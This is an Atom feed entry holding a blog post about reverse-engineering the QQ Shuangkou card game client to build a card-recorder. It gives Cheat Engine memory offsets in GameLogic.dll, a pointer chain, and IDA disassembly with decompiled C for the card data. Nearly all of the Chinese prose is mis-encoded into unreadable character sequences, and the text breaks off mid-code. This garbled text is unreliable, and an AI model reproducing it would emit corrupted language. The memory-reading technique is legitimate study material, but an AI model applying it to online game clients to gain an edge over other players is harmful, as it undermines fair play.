<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>GreatYYX Blog</title><link href="http://blog.yyx.name/" rel="alternate"></link><link href="http://blog.yyx.name/feeds/all.atom.xml" rel="self"></link><id>http://blog.yyx.name/</id><updated>2015-05-12T01:17:00+08:00</updated><entry><title>QQåŒæ‰£è®°ç‰Œå™¨å®ç°</title><link href="http://blog.yyx.name/posts/qq-card-game-recorder.html" rel="alternate"></link><updated>2015-05-12T01:17:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2015-05-12:posts/qq-card-game-recorder.html</id><summary type="html">&lt;h1&gt;åæ§½&lt;/h1&gt;
&lt;p&gt;åˆ°USCåˆ·masterçœŸå¯è°“â€œç©å‘½â€è¯»ä¹¦ï¼Œåœ¨å­¦æ ¡è¢«å¤§ç¥è™ï¼Œåœ¨è·¯ä¸Šæ€•è¢«é»‘å“¥è™ï¼Œå‡ºå»ç©è€è¢«æ¬¾çˆ·è™ï¼Œé€¢å¹´è¿‡èŠ‚è¢«ç§€æ©çˆ±çš„è™ï¼Œæ€»ä¹‹å°±æ˜¯å„ç§ä¸æ‹©æ‰‹æ®µèŠ±å¼è™ç‹—ã€‚å†åŠ ä¸Šè¿™å­¦æœŸæ‚²å‰§çš„é€‰è¯¾ï¼ŒæœŸæœ«ä¸‹æ¥ï¼Œå·²ç»åŸºæœ¬æ°”ç»ã€‚è€ƒé—­ï¼Œå‡†å¤‡æ‰“æ‰“ç‰Œæ‰¾æ‰¾ä¹å­ï¼Œä½œä¸ºæ­å·äººï¼Œå½“ç„¶æœ€çˆ±åŒæ‰£ï¼Œä½†æ˜¯å½“ä½ å‘ç°åŒæ‰£ç«Ÿç„¶åœ¨4æœˆåº•è¢«ä¼é¹…çš„ç¨‹åºçŒ¿æ”¹çš„é¢ç›®å…¨éä¹‹åï¼Œå°±æœ‰ç§æ°”æ€¥è´¥åçš„å´åˆæ— ä»æŠ±æ€¨çš„æ„Ÿè§‰ã€‚&lt;/p&gt;
&lt;p&gt;ä¹Ÿä¸çŸ¥é“æ€ä¹ˆæƒ³çš„ï¼Œçªç„¶å¾ˆæƒ³æä¸€ä¸ªè‡ªå·±çš„è®°ç‰Œå™¨ç©ç©ï¼ˆæˆ‘æ‰¿è®¤è¿™å„¿è½¬æŠ˜å¾ˆçªå…€ï¼Œå› ä¸ºæˆ‘è‡ªå·±ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆå½“æ—¶è¿˜æ²¡æ¥å¾—åŠæ‹è„‘é—¨å°±å†³å®šäº†ï¼‰ï¼Œæœ€åç«Ÿç„¶ä¸‰å¤©æŠ›å‡ºæˆå“ï¼ˆä¸å¯é¿å…æœ‰å°bugï¼‰ï¼Œäºæ˜¯å†³å®šæ’°æ–‡è®°å½•ä¸€ä¸‹ï¼Œè¡Œæ–‡å°±æŒ‰ç…§æ—¥å­æ¥äº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘è¿™è¾¹æµ‹è¯•çš„åŒæ‰£å¯æ‰§è¡Œæ–‡ä»¶skrpg.exeçš„æ–‡ä»¶ç‰ˆæœ¬æ˜¯2.0.107.14ï¼ŒMD5ä¸º1c6d85c0accf6ce1a834e947e5467412ã€‚å¾ˆå¯èƒ½æ¸¸æˆæ›´æ–°åæ•°æ®ä¼šæœ‰æ‰€ä¸åŒï¼ˆæ–°ç‰ˆæœ¬åˆšå‡ºæ¥æ›´æ–°ä¼šç‰¹åˆ«é¢‘ç¹ï¼‰ï¼Œä½†æ˜¯æ€è·¯ä¸å˜çš„ï¼Œä½ éœ€è¦å†æœºæ¢°åŠ³åŠ¨ä¸€æ¬¡æ›´æ–°æ‰€æœ‰æ•°æ®ã€‚&lt;/p&gt;
&lt;h1&gt;Day1 æŠ“æ•°æ®&lt;/h1&gt;
&lt;p&gt;å…¶å®ç¬¬ä¸€å¤©çš„æ—¶å€™è¿˜æ²¡å†³å®šçœŸçš„åšå‡ºä¸ªè®°ç‰Œå™¨ï¼Œå°±æƒ³ç ”ç©¶ä¸‹è¿™ç©æ„æ˜¯æ€ä¹ˆå®ç°çš„ï¼ˆå¥½å¥‡å¿ƒå®³æ­»çŒ«ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;è®°ç‰Œå™¨å®ç°åŸºæœ¬æ˜¯ä¸¤ç§æ€è·¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¬¬ä¸€ç§æ˜¯å›¾å½¢åŒ¹é…ï¼Œå°±æ˜¯æŠ“çª—å£çš„ç‰Œé¢ï¼Œå…¶å®è¿™å„¿åšåŒ¹é…è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œæ¯•ç«Ÿç‰Œé¢çš„æ ·å­æ˜¯ä¸ä¼šå˜çš„ï¼Œä¹Ÿä¸éœ€è¦ä»€ä¹ˆå¤æ‚çš„åŒ¹é…ç®—æ³•ï¼Œåªè¦å¼„ä¸‹æ¥æ‰€æœ‰ç‰Œé¢æä¸ªæ•°æ®åº“ï¼Œç›´æ¥å°±å¯ä»¥åŒ¹é…å¾—åˆ°æ•°æ®ã€‚éš¾åº¦åœ¨äºï¼Œçª—å£æ˜¯å¯ä»¥ç¼©æ”¾çš„ï¼Œå› æ­¤ç‰Œæ¡Œå¤§å°ä¸å›ºå®šï¼Œç‰Œçš„ç›¸å¯¹ä½ç½®ä¸æ¸…æ¥šæ˜¯ä¸æ˜¯æŒ‰ç…§æ¯”ä¾‹ç®—çš„ï¼›å¦å¤–ï¼Œæ–°ç‰ˆåŒæ‰£æ˜¯æ‰€è°“çš„è§’è‰²ç‰ˆï¼Œæ·»åŠ äº†ä¸€äº›åŠ¨ç”»æ•ˆæœï¼Œè¿™äº›æ•ˆæœå‡ºç°çš„æ—¶å€™ä¼šè¦†ç›–ä¸€éƒ¨åˆ†ç‰Œé¢ï¼Œè€Œä¸”æ˜¯åŠ¨æ€çš„ï¼Œå› æ­¤è¿™ä¸ªæ—¶å€™æŠ“å–ç‰Œé¢å°±ä¸æ˜¯ä¸€ç§ä¸€æˆä¸å˜çš„æƒ…å†µã€‚&lt;/li&gt;
&lt;li&gt;ç¬¬äºŒç§æ˜¯æŠ“æ•°æ®ï¼Œè¿™ç§æ²¡æœ‰ç¬¬ä¸€ç§ç›´è§‚ï¼Œå¾ˆå¤šæ—¶å€™éœ€è¦é æ¨ç†å’Œç¢°è¿æ°”å»çŒœæµ‹æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­çš„å½¢å¼ï¼Œå½“ç„¶å¦‚æœæ•°æ®åœ¨å†…å­˜ä¸­è¢«åŠ å¯†äº†ï¼Œé‚£å°±æ›´å€’éœ‰äº†ã€‚ä½†æ˜¯ä¸€æ—¦èƒ½æ­£ç¡®æŠ“å‡ºæ•°æ®å¹¶è§£ç ï¼Œå®ç°å°±éå¸¸ç®€å•ï¼Œè€Œä¸”æ­£ç¡®ç‡æ˜¯100%ã€‚å½“ç„¶æŠ“æ•°æ®ä¸å±€é™äºå†…å­˜æ•°æ®ï¼Œå¾ˆå¤šæ—¶å€™å¯èƒ½æ˜¯ç½‘ç»œæ•°æ®ï¼Œé‚£å°±éœ€è¦æŠ“åŒ…å•¦ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æˆ‘é€‰äº†ç¬¬äºŒç§ï¼ŒæŠ“å–å·¥å…·æ˜¯Cheat Engineï¼Œç›´æ¥ä»å†…å­˜æŠ“å–ã€‚é¦–å…ˆåˆæ­¥åˆ¤æ–­ä¸‹éœ€è¦æŠ“å–çš„æ•°æ®ï¼šæ‰€æœ‰ç©å®¶çš„å½“å‰å‰©ä½™çš„ç‰Œæ•°ï¼Œæ‰€æœ‰ç©å®¶æ¯æ¬¡å‡ºçš„ç‰Œï¼Œè‡ªå·±çš„åº§ä½ï¼Œå‘ç‰Œåè‡ªå·±çš„ç‰Œï¼ˆä½ ä¸€å®šå¾—ä¸åˆ°åˆ«äººçš„ç‰Œé¢ï¼Œè¿™äº›éƒ½åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¦‚æœä½ èƒ½å¾—åˆ°é‚£å°±ç›´æ¥åšä½œå¼Šå™¨äº†ï¼‰ã€‚&lt;/p&gt;
&lt;h2&gt;ç©å®¶å‰©ä½™ç‰Œæ•°&lt;/h2&gt;
&lt;p&gt;è¿™æ˜¯æ€è·¯æœ€ç®€å•ä¸”æœ€å¥½æŠ“çš„ä¸€æ­¥ã€‚ä¸€ä¸ªæ€ç»´æ­£å¸¸çš„ç¨‹åºçŒ¿ä¸€èˆ¬éƒ½ä¼šç”¨æ•´æ•°ç±»å‹æ¥è®°å½•ï¼Œä¹Ÿå°±æ˜¯æœ‰ç¬¦å·æ•´å½¢ï¼Œå› æ­¤ç›´æ¥æŠ“DWORDé•¿åº¦æ•°æ®ï¼Œæ ¹æ®ç‰Œæ•°é‡å˜åŒ–ï¼Œä¸æ–­ç¼©å°èŒƒå›´ï¼Œä¾æ¬¡åœ¨å†…å­˜ä¸­æ‰¾å‡º4ä¸ªç©å®¶çš„å‰©ä½™ç‰Œæ•°ä½ç½®ï¼Œæ‰¾åˆ°ä½ç½®åç”¨CEæŸ¥æ‰¾è°access/writeäº†è¿™äº›ä½ç½®ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„åœ°å€ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;DOWN:   &amp;quot;GameLogic.dll&amp;quot;+3CF20
LEFT:   &amp;quot;GameLogic.dll&amp;quot;+3CE30
UP:     &amp;quot;GameLogic.dll&amp;quot;+3D100
RIGHT:  &amp;quot;GameLogic.dll&amp;quot;+3D010
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™é‡Œçš„çš„DOWNã€LEFTã€UPã€RIGHTæ˜¯æˆ‘ç”¨æ¥è¡¨ç¤ºç©å®¶çš„åº§ä½çš„ï¼Œè¿™äº›åº§ä½æ˜¯å¤§å…ä¸­åº§ä½çš„ç»å¯¹ä½ç½®ï¼Œç†è§£è¿™ç‚¹å¾ˆé‡è¦ã€‚ä»æ‹¿åˆ°è¿™äº›æ•°æ®æ¥çœ‹ï¼Œè¿™äº›ä½ç½®æ˜¯é™æ€çš„ï¼ˆç›¸å¯¹GameLogic.dllåŠ è½½åŸºå€çš„åç§»ï¼‰ï¼ŒSo easy!&lt;/p&gt;
&lt;h2&gt;è‡ªèº«åº§ä½å·&lt;/h2&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥‡è‘©ä½†å¿…é¡»è§£å†³çš„é—®é¢˜ã€‚è¿˜æ˜¯å‡è®¾ä¼é¹…çš„ç¨‹åºçŒ¿æ˜¯ä¸è„‘æ®‹çš„ï¼Œé‚£åº§ä½å·åº”è¯¥æ˜¯è®¾è®¡æˆè¿ç»­æ’å¸ƒçš„ï¼Œå¯èƒ½æ˜¯0-3ï¼Œä¹Ÿå¯èƒ½æ˜¯1-4ï¼ˆå½“ç„¶å¦‚æœæ˜¯ä¸ªæ ‡å‡†ç¨‹åºçŒ¿åº”è¯¥é€‰å‰è€…ï¼Œé™¤éä»–æ˜¯baseä¸º1çš„VBå…šï¼‰ï¼Œåº§ä½å·çš„æ’åˆ—å¯èƒ½æ˜¯é¡ºæ—¶é’ˆï¼Œä¹Ÿå¯èƒ½æ˜¯é€†æ—¶é’ˆï¼Œå½“ç„¶è¿˜æœ‰å¯èƒ½è·³ç€æ’åˆ—ï¼ˆè¿™ä¸ªå¯èƒ½æ€§å¾ˆå°ï¼‰ã€‚äºæ˜¯æ’åˆ—ç»„åˆä¸€ä¸‹ï¼Œæ¯ç§æƒ…å†µèµ·å§‹ä½ç½®å¯èƒ½æœ‰4ç§ï¼Œç®—ä¸Šé¡ºæ—¶é’ˆé€†æ—¶é’ˆå°±æ˜¯æœ‰4x2=8ç§ï¼Œæ‰€ä»¥0-3å’Œ1-4åœ¨è¿ç»­æ’å¸ƒæƒ…å†µä¸‹æœ‰16ç§å¯èƒ½æ€§ã€‚åœ¨äº‘è®¡ç®—çš„å¹´ä»£ï¼Œ16æ˜¯ä¸ªå¤šä¹ˆæ¸ºå°çš„æ•°æ®ï¼Œç›´æ¥brutal forceï¼Œæ¯ç§æµ‹è¯•ä¸€æ¬¡å°±è¡Œã€‚æµ‹è¯•æ–¹æ³•å°±æ˜¯é€‰å–16ç§ä¸­çš„ä¸€ç§ï¼Œå‡è®¾å½“å‰è¿™ä¸ªcaseæˆç«‹ï¼Œé‚£è¿™ä¸ªåº§ä½åº”è¯¥æ˜¯Xï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªåº§ä½ï¼Œåº”è¯¥æ˜¯Yï¼Œè¿™æ ·ä¾æ¬¡æµ‹è¯•ï¼Œå¦‚æœæ¯æ¬¡æŠ“å‡ºæ¥çš„æ•°æ®éƒ½ç¬¦åˆåˆ¤æ–­ï¼Œå°±æ˜¯è¿™ä¸ªcaseäº†ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;  2
1   3
  0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æœ€åå¾—åˆ°çš„ç»“æœæ˜¯ä¸Šé¢è¿™ç§æƒ…å†µï¼Œ0æ˜¯DOWNï¼Œ1æ˜¯LEFTï¼Œ2æ˜¯UPï¼Œ3æ˜¯RIGHTï¼Œè¿™äº›ä½ç½®ä¾ç„¶æ˜¯å¤§å…ä¸­çš„ç»å¯¹ä½ç½®ã€‚è¿™é‡Œè¦æä¸€å¥ï¼Œæ‰¾åº§ä½çš„æ—¶å€™å¯èƒ½ä¼šæ‰¾åˆ°ä¸€ä¸ªåœ°å€ï¼Œæ¯æ¬¡éƒ½è‡ªå¢1ï¼Œå½“æ—¶æˆ‘è¿˜ä»¥ä¸ºæ˜¯è¿™ä¸ªï¼Œåæ¥å‘ç°æ¢äº†è¶…è¿‡4ä¸ªåº§ä½åå®ƒçš„æ•°æ®ä¾ç„¶åœ¨å¢é•¿ï¼Œæµ‹è¯•åå‘ç°å®ƒæ˜¯ç”¨æ¥è®°å½•ç©å®¶åœ¨è¿™æ¡Œå…¥åº§äº†å‡ æ¬¡ï¼Œä¸çŸ¥ä¼é¹…ç¨‹åºçŒ¿è®¾è®¡è¿™ä¸ªæ•°æ®æœ‰ä»€ä¹ˆç”¨â€¦â€¦&lt;/p&gt;
&lt;p&gt;æˆ‘å¤©çœŸçš„ä»¥ä¸ºåº§ä½å·ç¡®å®šäº†ï¼Œé‚£åº§ä½å·åœ¨å†…å­˜ä¸­çš„ä½ç½®ä¹Ÿå°±ç¡®å®šäº†ã€‚ä½†æ˜¯å½“æˆ‘ç‚¹è¿›å»çœ‹accessçš„åœ°å€å¤„çš„åæ±‡ç¼–çš„æ—¶å€™ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;02D30214 - 8B 4D F4  - mov ecx,[ebp-0C]
02D30217 - 8B 55 F8  - mov edx,[ebp-08]
02D3021A - 89 14 88   - mov [eax+ecx*4],edx &amp;lt;&amp;lt;
02D3021D - 6A 01 - push 01
02D3021F - 66 8B 45 F4  - mov ax,[ebp-0C]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¾ˆé—æ†¾ï¼Œè¿™ç©æ„åœ°å€ä¸æ˜¯å›ºå®šçš„ï¼Œå› æ­¤éœ€è¦æ‰¾å®ƒçš„æŒ‡é’ˆï¼Œå¾ˆå¯èƒ½è¿˜è¦æ‰¾å®ƒæŒ‡é’ˆçš„æŒ‡é’ˆï¼Œç”šè‡³æ›´å¤šå±‚ã€‚å½“æˆ‘æ‰¾äº†ä¸¤å±‚ä¹‹åï¼Œå‘ç°ä¾ç„¶æ˜¯å˜åŒ–çš„åœ°å€ã€‚æ— å¥ˆè°ƒå‡ºIDAå®Œæ•´çš„çœ‹äº†ä¸‹è¿™æ®µåæ±‡ç¼–ï¼Œå‘ç°ç«Ÿç„¶æ˜¯åŸºäºebpçš„ä¼ å…¥å‚æ•°ï¼Œå› æ­¤æ˜¯ä¸å›ºå®šçš„ã€‚æ­¤æ—¶çªç„¶æƒ³åˆ°CEæœ‰ä¸ªè‡ªåŠ¨æ‰¾æŒ‡é’ˆçš„åŠŸèƒ½ï¼Œäºæ˜¯è¯·å‡ºè¿™ä¸ªç‰›Xçš„å¤§æ€å™¨ï¼Œç¬é—´1ä¸ªGçš„æŒ‡é’ˆæ•°æ®å°±ç®—å‡ºæ¥äº†ï¼ˆè¿™å‡­äººæ‰‹æ¥æ‰¾å¾—æ‰¾åˆ°ä»€ä¹ˆæ—¶å€™ï¼‰ï¼Œå‘ç°ç«Ÿç„¶æœ‰5å±‚å·¦å³çš„æŒ‡é’ˆè°ƒç”¨ï¼Œè¿˜éƒ½æ˜¯ä¸åŒåŸºå€çš„ï¼Œç­›é€‰ä¸‹2-3å±‚çš„è°ƒç”¨ï¼Œæ‰¾åˆ°ä¸€ä¸ªç›¸å¯¹å¯ä»¥æ¥å—çš„åç§»ï¼š&lt;code&gt;[[["GameLogic.dll"+3DCB4]+88]+4]&lt;/code&gt;ï¼Œè€Œä¸”åŸºå€å’Œå‰é¢ç®—ç©å®¶å‰©ä½™ç‰Œæ•°çš„ä¸€è‡´ï¼ŒPerfect!&lt;/p&gt;
&lt;h2&gt;ç‰Œé¢æ•°æ®&lt;/h2&gt;
&lt;p&gt;ç‰Œé¢æ•°æ®çš„æ¨æ–­ç®€ç›´å°±æ˜¯æ‹¼è„‘æ´ã€‚åˆæ­¥æƒ³ä¸€ä¸‹ç‰Œé¢å¯èƒ½æ¶‰åŠåˆ°æ•°æ®æ˜¯èŠ±è‰²å’Œç‚¹æ•°ï¼Œè™½ç„¶èŠ±è‰²åœ¨åŒæ‰£ä¸­æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œä½†æ˜¯å¯¹äºæ¸¸æˆçš„æ˜¾ç¤ºæ¥è¯´ï¼ŒèŠ±è‰²æ˜¯å¿…é¡»è¦çš„ï¼Œå› ä¸ºèŠ±è‰²æ˜¯ç‰Œå±æ€§çš„ä¸€éƒ¨åˆ†ã€‚å½“ä½ æƒ³åˆ°è¿™å„¿çš„æ—¶å€™ä½ ä¼šå‘ç°ï¼Œç‰Œçš„å­˜å‚¨å¾ˆå¯èƒ½æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„æ•°æ®ç±»å‹ï¼Œè€Œè¿™ä¸ªç±»å‹çš„æ ¼å¼æ˜¯ä¸çŸ¥é“çš„ï¼Œè‡ªå®šä¹‰æ ¼å¼ä¸­æ¯ä¸ªå­—æ®µé•¿åº¦ä¹Ÿæ˜¯ä¸çŸ¥é“çš„ï¼ŒåŒæ‰£æœ‰ä¸¤å‰¯ç‰Œï¼Œå› æ­¤åŒ…å«å¤§å°ç‹åœ¨å†…æœ‰ç­‰äºæˆ–è¶…è¿‡ä¸¤å¼ ä»¥ä¸Šçš„é‡å¤ç‰Œï¼Œæ¯æ¬¡å‡ºç‰Œæ•°é‡æ˜¯ä¸ç¡®å®šçš„ï¼Œå› æ­¤ä¹Ÿä¸çŸ¥é“æ­¤æ—¶å†…å­˜ä¸­ç‰Œæœ‰å‡ å¼ ï¼Œè¿™ä¸€ç»„ç‰Œç”¨ä»€ä¹ˆæ–¹å¼è¢«è¡¨ç¤ºã€‚æˆ‘å‡­å€Ÿè‡ªè®¤ä¸ºç¢‰å ¡çš„æ™ºå•†åœ¨è„‘æ´å¤§å¼€çš„æƒ…å†µä¸‹çŒœæµ‹äº†å‡ æ¬¡ï¼Œå‘ç°è¿™ä¸ªæ·å¾„èµ°ä¸äº†ï¼Œè€è€å®å®å¼€IDAçœ‹åæ±‡ç¼–å»â€¦â€¦&lt;/p&gt;
&lt;p&gt;é¦–å…ˆåˆ¤æ–­ç‰Œé¢çš„æ•°æ®å¤„ç†åº”è¯¥ä¹Ÿæ˜¯åœ¨GameLogic.dllä¸­ï¼Œç›´æ¥åˆ†æè¿™ä¸ªæ¨¡å—æ–‡ä»¶ï¼Œå½“ç„¶ä¸€èˆ¬æƒ…å†µä¸‹ä¸å¯èƒ½ä»å¤´çœ‹åæ±‡ç¼–ï¼Œè¿™æ ·çš„æœç´¢æ•ˆç‡å¤ªä½äº†ã€‚æŸ¥çœ‹ä¸€ä¸‹æ¨¡å—çš„å¯¼å‡ºè¡¨ï¼Œæ²¡æœ‰æœ‰ä»·å€¼çš„å‡½æ•°å…¥å£ï¼Œäºæ˜¯ä»å­—ç¬¦ä¸²æ‰¾çªç ´å£ã€‚å­—ç¬¦ä¸²ä¸­å‡ºç°è¯¸å¦‚&lt;code&gt;CCardsGameLogic::OnGameStart\n&lt;/code&gt;æ ·å­çš„å‡½æ•°åï¼Œç‚¹è¿›å»å‘ç°æ˜¯å›è°ƒå‡½æ•°ï¼Œè¿˜æœ‰ç±»ä¼¼&lt;code&gt;RefreshCardsInHand\n&lt;/code&gt;çš„debugç”¨çš„å­—ç¬¦ä¸²ï¼Œä¸è¿‡è¿™äº›ä½ç½®çš„ä¸Šä¸‹æ–‡éƒ½æ²¡æœ‰æä¾›æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚åˆå°è¯•äº†ä¸€äº›æ–¹å¼éƒ½æ²¡æœ‰å¾ˆå¥½çš„çªç ´å£ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªæ‡’äººï¼Œæ€ä¹ˆèƒ½å‘ä»å¤´åˆ·ä»£ç é‚£ä¹ˆlowçš„æ–¹å¼ä½å¤´å‘¢ï¼Ÿäºæ˜¯å‡†å¤‡ç»§ç»­å¼€è„‘æ´â€¦â€¦&lt;/p&gt;
&lt;p&gt;çŒœæµ‹ä¸€ä¸‹ç‰¹å¾æ•°æ®ã€‚æ¯å‰¯ç‰Œ54å¼ ï¼ŒåŒæ‰£ä¸€å…±2å‰¯ç‰Œ108å¼ ï¼Œ4ä¸ªäººæ‰“ï¼Œæ¯ä¸ªäººå°±æ˜¯27å¼ ã€‚åˆå§‹åŒ–çš„æ—¶å€™åº”è¯¥ä¼šæ¯ä¸ªäººå‘27å¼ ç‰Œï¼Œé‚£æ—¶å€™åº”è¯¥ä¼šæœ‰ä¸ªå¾ªç¯åˆ†é…è¿™27å¼ ç‰Œã€‚äºæ˜¯ç›´æ¥åœ¨IDAä¸­æ‰¾ç«‹å³æ•°27ï¼Œå‘ç°ä¸€å¤„æœ‰ä»·å€¼çš„ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:10020D8C ; int __stdcall sub_10020D8C(COleControl *)
.text:10020D8C sub_10020D8C    proc near               ; CODE XREF: sub_10007D2E+97p
.text:10020D8C                                         ; sub_100081D9+151p ...
.text:10020D8C
.text:10020D8C var_10          = dword ptr -10h
.text:10020D8C var_C           = dword ptr -0Ch
.text:10020D8C var_8           = dword ptr -8
.text:10020D8C var_4           = dword ptr -4
.text:10020D8C arg_0           = dword ptr  8
.text:10020D8C
.text:10020D8C                 push    ebp
.text:10020D8D                 mov     ebp, esp
.text:10020D8F                 sub     esp, 10h
.text:10020D92                 mov     [ebp+var_10], ecx
.text:10020D95                 mov     ecx, [ebp+arg_0]
.text:10020D98                 call    sub_10034BF0
.text:10020D9D                 mov     [ebp+var_8], eax
.text:10020DA0                 mov     [ebp+var_4], 0
.text:10020DA7                 jmp     short loc_10020DB2
.text:10020DA9 ; ---------------------------------------------------------------------------
.text:10020DA9
.text:10020DA9 loc_10020DA9:                           ; CODE XREF: sub_10020D8C+68j
.text:10020DA9                 mov     eax, [ebp+var_4]
.text:10020DAC                 add     eax, 1
.text:10020DAF                 mov     [ebp+var_4], eax
.text:10020DB2
.text:10020DB2 loc_10020DB2:                           ; CODE XREF: sub_10020D8C+1Bj
.text:10020DB2                 mov     ecx, [ebp+arg_0] ; this
.text:10020DB5                 call    ?GetClientSite@COleControl@@QAEPAUIOleClientSite@@XZ ; COleControl::GetClientSite(void)
.text:10020DBA                 cmp     [ebp+var_4], eax
.text:10020DBD                 jge     short loc_10020DF6
.text:10020DBF                 cmp     [ebp+var_4], 1Bh
.text:10020DC3                 jg      short loc_10020DF6
.text:10020DC5                 mov     ecx, [ebp+var_4]
.text:10020DC8                 mov     edx, [ebp+var_8]
.text:10020DCB                 movsx   eax, byte ptr [edx+ecx*4+1]
.text:10020DD0                 push    eax
.text:10020DD1                 mov     ecx, [ebp+var_10]
.text:10020DD4                 call    sub_10020DFE
.text:10020DD9                 mov     [ebp+var_C], eax
.text:10020DDC                 mov     ecx, [ebp+var_4]
.text:10020DDF                 mov     edx, [ebp+var_8]
.text:10020DE2                 mov     al, byte ptr [ebp+var_C]
.text:10020DE5                 mov     [edx+ecx*4+3], al
.text:10020DE9                 mov     ecx, [ebp+var_4]
.text:10020DEC                 mov     edx, [ebp+var_8]
.text:10020DEF                 mov     byte ptr [edx+ecx*4+2], 0
.text:10020DF4                 jmp     short loc_10020DA9
.text:10020DF6 ; ---------------------------------------------------------------------------
.text:10020DF6
.text:10020DF6 loc_10020DF6:                           ; CODE XREF: sub_10020D8C+31j
.text:10020DF6                                         ; sub_10020D8C+37j
.text:10020DF6                 xor     eax, eax
.text:10020DF8                 mov     esp, ebp
.text:10020DFA                 pop     ebp
.text:10020DFB                 retn    4
.text:10020DFB sub_10020D8C    endp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;F5åˆ°Cè¯­è¨€åå…³é”®éƒ¨åˆ†æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;...
for ( i = 0; i &amp;lt; COleControl::GetClientSite(a1) &amp;amp;&amp;amp; i &amp;lt;= 27; ++i )
{
    *(_BYTE *)(v2 + 4 * i + 3) = sub_10020DFE(*(_BYTE *)(v2 + 4 * i + 1));
    *(_BYTE *)(v2 + 4 * i + 2) = 0;
}
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹å‡ºè¿™ç±»ä¼¼äºä¸€ä¸ªæ•°ç»„æ“ä½œï¼Œè€Œæ•°ç»„æ¯ä¸ªå…ƒç´ ä¸­è‡³å°‘æœ‰4ä¸ªbyteé•¿åº¦çš„å€¼ï¼ˆå¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªè‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼‰ï¼Œåˆ†åˆ«æ˜¯ï¼šç¬¬0ä¸ªä¸æ¸…æ¥šï¼Œç¬¬3ä¸ªæ˜¯ç¬¬1ä¸ªç»è¿‡è¿ç®—çš„ç»“æœï¼Œç¬¬2ä¸ªæ’ä¸º0ã€‚ç‚¹è¿›å»çœ‹è¡¨ç¤ºç¬¬3ä¸ªå’Œç¬¬1ä¸ªå…ƒç´ ä¹‹é—´çš„å‡½æ•°&lt;code&gt;sub_10020DFE&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:10020DFE sub_10020DFE    proc near               ; CODE XREF: sub_10020D8C+48p
.text:10020DFE
.text:10020DFE var_8           = dword ptr -8
.text:10020DFE var_4           = dword ptr -4
.text:10020DFE arg_0           = dword ptr  8
.text:10020DFE
.text:10020DFE                 push    ebp
.text:10020DFF                 mov     ebp, esp
.text:10020E01                 sub     esp, 8
.text:10020E04                 mov     [ebp+var_8], ecx
.text:10020E07                 mov     eax, [ebp+arg_0]
.text:10020E0A                 mov     [ebp+var_4], eax
.text:10020E0D                 cmp     [ebp+arg_0], 2
.text:10020E11                 jnz     short loc_10020E1C
.text:10020E13                 mov     [ebp+var_4], 0Eh
.text:10020E1A                 jmp     short loc_10020E4B
.text:10020E1C ; ---------------------------------------------------------------------------
.text:10020E1C
.text:10020E1C loc_10020E1C:                           ; CODE XREF: sub_10020DFE+13j
.text:10020E1C                 cmp     [ebp+arg_0], 1
.text:10020E20                 jnz     short loc_10020E2B
.text:10020E22                 mov     [ebp+var_4], 0Ch
.text:10020E29                 jmp     short loc_10020E4B
.text:10020E2B ; ---------------------------------------------------------------------------
.text:10020E2B
.text:10020E2B loc_10020E2B:                           ; CODE XREF: sub_10020DFE+22j
.text:10020E2B                 cmp     [ebp+arg_0], 0Eh
.text:10020E2F                 jz      short loc_10020E37
.text:10020E31                 cmp     [ebp+arg_0], 0Fh
.text:10020E35                 jnz     short loc_10020E42
.text:10020E37
.text:10020E37 loc_10020E37:                           ; CODE XREF: sub_10020DFE+31j
.text:10020E37                 mov     ecx, [ebp+var_4]
.text:10020E3A                 add     ecx, 1
.text:10020E3D                 mov     [ebp+var_4], ecx
.text:10020E40                 jmp     short loc_10020E4B
.text:10020E42 ; ---------------------------------------------------------------------------
.text:10020E42
.text:10020E42 loc_10020E42:                           ; CODE XREF: sub_10020DFE+37j
.text:10020E42                 mov     edx, [ebp+var_4]
.text:10020E45                 sub     edx, 2
.text:10020E48                 mov     [ebp+var_4], edx
.text:10020E4B
.text:10020E4B loc_10020E4B:                           ; CODE XREF: sub_10020DFE+1Cj
.text:10020E4B                                         ; sub_10020DFE+2Bj ...
.text:10020E4B                 mov     eax, [ebp+var_4]
.text:10020E4E                 mov     esp, ebp
.text:10020E50                 pop     ebp
.text:10020E51                 retn    4
.text:10020E51 sub_10020DFE    endp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ®µç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;X = ç¬¬ä¸€ä¸ªå…ƒç´ 
Y = ç¬¬ä¸‰ä¸ªå…ƒç´ 
if (X == 1)
    Y = 12
else if (X == 2)
    Y = 14
else if (X == 14 || X == 15)
